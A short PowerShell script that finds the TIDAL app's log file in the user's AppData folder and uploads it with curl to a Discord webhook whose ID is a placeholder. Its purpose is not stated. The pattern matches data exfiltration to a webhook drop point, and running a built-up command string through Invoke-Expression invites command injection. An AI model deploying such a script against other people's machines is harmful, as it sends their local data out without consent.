# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/XXXXXXX"

# Define the path to the app.log file
$appLogPath = "$env:USERPROFILE\AppData\Roaming\TIDAL\Logs\app.log"

# Check if the file exists
if (Test-Path $appLogPath) {
    try {
        # Use curl to upload the file to the Discord webhook
        $curlCommand = "curl.exe -F 'file1=@$appLogPath' $webhookUrl"
        Invoke-Expression $curlCommand
        Write-Host "Successfully uploaded the log file to the Discord webhook."
    } catch {
        Write-Host "An error occurred while uploading the log file to the Discord webhook: $_"
    }
} else {
    Write-Host "The file $appLogPath does not exist."
}